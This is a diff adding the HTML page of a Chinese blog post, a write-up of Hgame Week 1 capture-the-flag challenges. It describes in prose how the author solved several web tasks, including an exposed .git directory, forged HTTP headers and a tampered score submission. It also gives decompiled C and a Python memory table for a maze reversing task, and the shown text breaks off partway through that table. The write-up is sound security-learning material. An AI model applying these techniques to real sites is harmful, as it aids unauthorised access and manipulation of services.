@@ -1,0 +1,1207 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <title> xᴊᴀsᴏɴʟʏᴜ | Hgame Week1 Writeup </title>
+    <meta charset="utf-8"><meta name="generator" content="Hugo 0.69.2" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="description" content="ID = randint(0, 1) ? 12x : xjasonlyu">
+    <link rel="stylesheet" href="https://12x.me/css/style.css" type="text/css">
+    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    <base href="https://12x.me">
+    
+    <link rel="shortcut icon" href="https://12x.me/favicons/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://12x.me/favicons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://12x.me/favicons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://12x.me/favicons/favicon-16x16.png">
+
+    <link rel="canonical" href="https://12x.me/post/hgame-week1-writeup/">
+</head><body><div class="sidebar animated fadeInDown">
+    <div class="logo-title">
+      <div class="title">
+        <img src="https://12x.me/images/profile.jpg" alt="profile picture" style="width:127px;border-radius: 50%;">
+        <h3 title=""><a href="/">I&#39;m Jason Lyu</a></h3>
+        <div class="description">
+          <p>ID = randint(0, 1) ? 12x : xjasonlyu</p>
+        </div>
+      </div>
+    </div>
+    <ul class="social-links">
+        
+        <a href="https://twitter.com/xjasonlyu" rel="me" >
+          <i class="fa fa-twitter" aria-hidden="true" title="Twitter"></i>
+        </a>
+        
+        <a href="https://github.com/xjasonlyu" rel="me" >
+          <i class="fa fa-github" aria-hidden="true" title="GitHub"></i>
+        </a>
+        
+        <a href="mailto:this@12x.me" rel="me" >
+          <i class="fa fa-envelope" aria-hidden="true" title="e-mail"></i>
+        </a>
+        
+    </ul>
+    <div class="footer">
+        <div class="by_farbox">&copy; xᴊᴀsᴏɴʟʏᴜ 2020 </div>
+      </div>
+    </div>
+</div><div class="main">
+            <div class="page-top animated fadeInDown">
+    <div class="nav">
+        
+        
+        <li><a  href="/" title="">Home</a></li>
+
+        
+        <li><a  href="/post/" title="">Archive</a></li>
+
+        
+        <li><a  href="/about/" title="About">About</a></li>
+
+        
+    </div>
+</div>
+            <div class="autopagerize_page_element">
+                <div class="content">
+<div class="post animated fadeInDown">
+    <div class="post-content">
+
+      <div class="post-title">
+        <h3>Hgame Week1 Writeup
+        </h3>
+        
+        <div class="info">
+          <i class="fa fa-sun-o"></i><span class="date">Fri, Jan 17, 2020</span>
+          <i class="fa fa-clock-o"></i><span class="reading-time">22-minute read</span>
+        </div>
+        
+        </div>
+
+    <h2 id="hgame-week1-writeup">Hgame Week1 Writeup</h2>
+<p><img src="media/15792383134168/logo.png" alt="logo"></p>
+<h3 id="0x00-web">0x00 Web</h3>
+<h4 id="cosmos-的博客">Cosmos 的博客</h4>
+<p>既然是 Github+版本管理工具，那么就想到<code>.git</code>目录了，<code>/.git/config</code>进去如下图
+<img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%201.20.13%20PM.png" alt="Screen Shot 2020-01-17 at 1.20.13 Π">
+找到了项目的GitHub地址，然后找commit，找到了这个
+<img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%201.22.34%20PM.png" alt="Screen Shot 2020-01-17 at 1.22.34 Π">
+base64解码后拿到flag</p>
+<h4 id="接-头-霸-王">接 头 霸 王</h4>
+<p>呃，反正就是跟着提示一步一步伪造HTTP请求头呗，
+直接拿Burp上了，然后拿到flag。
+<img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%202.12.36%20PM.png" alt="Screen Shot 2020-01-17 at 2.12.36 P"></p>
+<h4 id="code-world">Code World</h4>
+<p>这道题有一点点迷，打开网页403，抓包看到<code>Location</code>跳转。。
+不管/new.php，因为看上去没啥用。。
+回到/
+HTTP状态码302，但是html是405。。
+想来想去不知道干嘛，乱试了几下，用了HEAD，PUT，POST后发现POST有东西。。
+<img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%202.29.48%20PM.png" alt="Screen Shot 2020-01-17 at 2.29.48 P">
+然后根据提示POST，把<code>+</code>用url编码成<code>%2B</code>然后提交，flag就出来了。。
+<img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%202.33.17%20PM.png" alt="Screen Shot 2020-01-17 at 2.33.17 P"></p>
+<h4 id="尼泰玫">🐔尼泰玫</h4>
+<p>打了一关，提示要30000分以上，然后F12，Network，发现有submit
+那么就<code>Edit and Resend</code>好了。
+<img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%203.06.14%20PM.png" alt="Screen Shot 2020-01-17 at 3.06.14 P">
+改成了35000分，双击拿到flag。。
+<img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%203.07.25%20PM.png" alt="Screen Shot 2020-01-17 at 3.07.25 P"></p>
+<h5 id="week1-web-ak">Week1 Web AK</h5>
+<h3 id="0x01-reverse">0x01 Reverse</h3>
+<h4 id="maze-迷宫">Maze 迷宫</h4>
+<p>呃，这题有点意思，不过也做了挺久。
+先是拖进ida，然后F5，源码分析一通</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
+{
+  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// [rsp+0h] [rbp-80h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v5; <span style="color:#75715e">// [rsp+8h] [rbp-78h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">48</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-70h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v7; <span style="color:#75715e">// [rsp+40h] [rbp-40h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v8; <span style="color:#75715e">// [rsp+78h] [rbp-8h]
+</span><span style="color:#75715e"></span>
+  v8 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
+  sub_4006A6(a1, a2, a3);
+  __isoc99_scanf(<span style="color:#e6db74">&#34;%40s&#34;</span>, s);
+  HIDWORD(v4) <span style="color:#f92672">=</span> strlen(s);
+  LODWORD(v4) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  v5 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_6020C4;
+  <span style="color:#66d9ef">while</span> ( (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span>)v4 <span style="color:#f92672">&lt;</span> SHIDWORD(v4) )
+  {
+    v3 <span style="color:#f92672">=</span> s[(<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span>)v4];
+    <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">100</span> )
+    {
+      v5 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>;
+    }
+    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span> )
+    {
+      <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">115</span> )
+      {
+        v5 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">64</span>;
+      }
+      <span style="color:#66d9ef">else</span>
+      {
+        <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">119</span> )
+        {
+LABEL_12:
+          puts(<span style="color:#e6db74">&#34;Illegal input!&#34;</span>);
+          exit(<span style="color:#ae81ff">0</span>);
+        }
+        v5 <span style="color:#f92672">-=</span> <span style="color:#ae81ff">64</span>;
+      }
+    }
+    <span style="color:#66d9ef">else</span>
+    {
+      <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">97</span> )
+        <span style="color:#66d9ef">goto</span> LABEL_12;
+      v5 <span style="color:#f92672">-=</span> <span style="color:#ae81ff">4</span>;
+    }
+    <span style="color:#66d9ef">if</span> ( v5 <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_602080 <span style="color:#f92672">||</span> v5 <span style="color:#f92672">&gt;</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_60247C <span style="color:#f92672">||</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)v5 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> )
+      <span style="color:#66d9ef">goto</span> LABEL_22;
+    LODWORD(v4) <span style="color:#f92672">=</span> v4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+  }
+  <span style="color:#66d9ef">if</span> ( v5 <span style="color:#f92672">==</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_60243C )
+  {
+    sprintf(<span style="color:#f92672">&amp;</span>v7, <span style="color:#e6db74">&#34;hgame{%s}&#34;</span>, s, v4);
+    puts(<span style="color:#e6db74">&#34;You win!&#34;</span>);
+    printf(<span style="color:#e6db74">&#34;Flag is: &#34;</span>);
+    puts(<span style="color:#f92672">&amp;</span>v7);
+    exit(<span style="color:#ae81ff">0</span>);
+  }
+LABEL_22:
+  puts(<span style="color:#e6db74">&#34;You died&#34;</span>);
+  exit(<span style="color:#ae81ff">0</span>);
+}
+</code></pre></div><p>可知能用的键只有<code>{'d': 4, 's': 64, 'w': -64, 'a': -4}</code>这么几个，不然就会<code>puts(&quot;Illegal input!&quot;)</code>
+再分析发现它是在一段<code>.data</code>段之间移动，出了就<code>You died</code>。。
+起点是<code>0x6020C4</code>，终点是<code>0x60243C</code>，于是把那一段内存复制了出来，写个脚本。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">maze <span style="color:#f92672">=</span> (
+    (<span style="color:#ae81ff">0x602080</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602081</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602082</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602083</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602084</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602085</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602086</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602087</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602088</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602089</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60208A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60208B</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60208C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60208D</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60208E</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60208F</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602090</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602091</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602092</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602093</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602094</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602095</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602096</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602097</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602098</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602099</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60209A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60209B</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60209C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60209D</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60209E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60209F</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6020A0</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020A1</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020A2</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020A3</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020A4</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020A5</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020A6</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020A7</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x6020A8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020A9</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020AA</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020AB</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020AC</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020AD</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020AE</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020AF</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6020B0</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020B1</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020B2</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020B3</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020B4</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020B5</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020B6</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020B7</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x6020B8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020B9</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020BA</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020BB</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020BC</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020BD</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020BE</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020BF</span>, <span style="color:#ae81ff">1</span>),
+                                                                <span style="color:#75715e">#BEGIN unk_6020C4</span>
+    (<span style="color:#ae81ff">0x6020C0</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020C1</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020C2</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020C3</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020C4</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020C5</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020C6</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020C7</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6020C8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020C9</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020CA</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020CB</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020CC</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020CD</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020CE</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020CF</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6020D0</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020D1</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020D2</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020D3</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020D4</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020D5</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020D6</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020D7</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6020D8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020D9</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020DA</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020DB</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020DC</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020DD</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020DE</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020DF</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x6020E0</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020E1</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020E2</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020E3</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020E4</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020E5</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020E6</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020E7</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x6020E8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020E9</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020EA</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020EB</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020EC</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020ED</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020EE</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020EF</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x6020F0</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020F1</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020F2</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020F3</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020F4</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020F5</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020F6</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020F7</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6020F8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020F9</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020FA</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6020FB</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020FC</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020FD</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020FE</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6020FF</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602100</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602101</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602102</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602103</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602104</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602105</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602106</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602107</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602108</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602109</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60210A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60210B</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60210C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60210D</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60210E</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60210F</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602110</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602111</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602112</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602113</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602114</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602115</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602116</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602117</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602118</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602119</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60211A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60211B</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60211C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60211D</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60211E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60211F</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602120</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602121</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602122</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602123</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602124</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602125</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602126</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602127</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602128</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602129</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60212A</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60212B</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60212C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60212D</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60212E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60212F</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602130</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602131</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602132</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602133</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602134</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602135</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602136</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602137</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602138</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602139</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60213A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60213B</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60213C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60213D</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60213E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60213F</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602140</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602141</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602142</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602143</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602144</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602145</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602146</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602147</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602148</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602149</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60214A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60214B</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60214C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60214D</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60214E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60214F</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602150</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602151</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602152</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602153</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602154</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602155</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602156</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602157</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602158</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602159</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60215A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60215B</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60215C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60215D</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60215E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60215F</span>, <span style="color:#ae81ff">0</span>),
